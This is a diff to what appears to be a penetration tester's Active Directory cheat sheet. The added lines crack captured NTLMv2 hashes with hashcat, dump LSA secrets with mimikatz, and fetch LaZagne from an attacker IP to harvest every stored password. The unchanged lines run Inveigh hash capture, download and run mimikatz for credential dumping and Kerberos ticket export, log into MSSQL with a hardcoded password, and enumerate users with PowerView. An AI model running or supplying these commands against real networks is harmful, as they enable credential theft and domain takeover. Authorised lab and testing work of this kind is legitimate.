@@ -17,7 +17,9 @@ GET NTLMV2UNIQUE
 GET NTLMV2USERNAMES
 
 Import-Module .\Inveigh.ps1
-Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+hashcat -m 5600 adm.ntlmv2 ~/rockyou.txt
 ```
 
 ```powershell
@@ -56,11 +58,17 @@ impacket-mssqlclient aerospace.com/discovery:'Start123!'@192.168.193.40 -windows
 curl $ip/mimikatz.exe -o mimikatz.exe
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
+
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
 dir *.kirbi
 kerberos::ptt <ticket>
 ```
 
+```powershell
+iwr http://10.10.15.155/LaZagne.exe -o lazagne.exe 
+lazagne.exe all
+```
 #### PowerView
 ```powershell
 Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
